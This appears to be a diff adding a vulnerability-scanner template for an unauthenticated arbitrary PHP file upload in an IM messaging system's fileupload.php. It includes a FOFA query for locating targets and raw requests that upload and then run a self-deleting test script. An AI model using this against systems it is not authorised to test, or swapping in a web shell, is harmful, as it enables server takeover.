@@ -1,0 +1,42 @@
+id: IM-fileupload_php-File-upload
+
+info:
+  name: IM 即时通讯系统 fileupload.php 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="/superloginAction.html" || "im.smiaoshen.com"
+    IM 即时通讯系统 fileupload.php 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s/mN4xDSfcapBu2WmfiszgWg
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /static/lib/webuploader/0.1.5/server/fileupload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz
+
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Content-Disposition: form-data; name="file"; filename="{{username}}.php"
+        Content-Type: text/plain
+
+        <?php print(111*222);unlink(__FILE__);?>
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+  - raw:
+      - |
+        GET /static/lib/webuploader/0.1.5/server/upload/{{username}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
